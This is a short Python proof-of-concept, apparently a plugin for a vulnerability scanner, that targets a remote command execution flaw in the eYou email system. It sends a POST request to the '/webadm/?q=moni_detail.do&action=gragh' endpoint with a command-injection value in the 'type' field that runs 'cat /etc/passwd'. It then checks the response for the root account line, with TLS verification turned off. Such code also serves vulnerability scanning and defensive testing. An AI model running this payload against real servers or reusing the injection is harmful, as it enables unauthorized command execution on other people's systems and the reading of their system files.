# 亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令
# https://blog.csdn.net/qq_45742511/article/details/115734373


import requests
from plugin.target_parse import get_standard_url

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def poc(url):
    if not url.startswith("http"):
        url = "https://" + url
    url = get_standard_url(url)
    vuln_url = url + '/webadm/?q=moni_detail.do&action=gragh'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data= "type='|cat /etc/passwd||'"
    try:
        response1 = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response1.status_code == 200 and 'root:x:0:0' in response1.text:
            return True

    except Exception as e:
        pass
    return False